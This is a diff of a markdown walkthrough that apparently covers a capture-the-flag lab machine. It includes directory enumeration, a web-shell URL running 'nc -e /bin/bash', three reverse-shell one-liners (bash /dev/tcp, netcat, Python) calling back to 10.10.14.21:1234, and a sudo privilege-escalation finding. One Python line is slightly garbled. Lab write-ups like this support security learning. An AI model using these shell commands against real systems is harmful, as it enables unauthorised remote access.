@@ -9,6 +9,7 @@
 **2. Dirb/ Gobuster**
 
 dirb http://10.10.10.146
+
 dirb http://10.10.10.146 -X .php
 
 ![n2](https://user-images.githubusercontent.com/15195048/93912555-c1926400-fcb8-11ea-8d78-6e845abdae2d.png)
@@ -63,8 +64,11 @@ view-source:http://10.10.10.146/uploads/10_10_14_21.php.jpeg?cmd=nc -e /bin/bash
 
 
 Try..
+
 A)bash -i >& /dev/tcp/10.10.14.21/1234 0>&1
+
 B) nc -e /bin/sh 10.10.14.21 1234  DONE
+
 C) python -c 'import soc ket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.21",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);’
 
 
@@ -90,10 +94,10 @@ We see that it scans for files, If the files were found as malicious, then a cro
 
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------
 # Privilege Escalation
-  
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    sudo -l
    (root) NOPASSWD: /usr/local/sbin/changename.sh
-
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
    As guly I checked sudo -l and found that guly can run /usr/local/sbin/changename.sh as root without a password:
    
